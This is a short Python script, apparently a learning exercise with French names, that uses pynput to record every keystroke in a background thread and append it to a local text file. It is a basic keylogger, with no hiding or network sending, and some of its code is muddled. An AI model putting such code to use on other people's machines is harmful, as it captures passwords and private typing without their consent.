from pynput import keyboard
from pynput.keyboard import Controller
import threading
import re

regexEspace = re.compile('Key.space')

# Initialize an empty string to store the typed keys
typed_keys = ""

# Define the function called when a key is pressed
def appuie(key):
    global typed_keys
    try:
        # Append the pressed key to the string
        typed_keys += key.char
    except AttributeError:
        # If the key is not a character, append the key's code
        typed_keys += str(key)

    with open("enregistrement_clavier.txt", "a") as f:
        f.write(f"Touche pressée: {typed_keys}\n")

# Function to run the keyboard listener in a separate thread
def start_listener():
    with keyboard.Listener(on_press=appuie) as listener:
        listener.join()

# Start the listener in a separate thread
listener_thread = threading.Thread(target=start_listener)
listener_thread.start()

# Keep the main thread running without blocking
keyboard_controller = Controller()
keyboard_controller.press(keyboard.Key.esc)
keyboard_controller.release(keyboard.Key.esc)
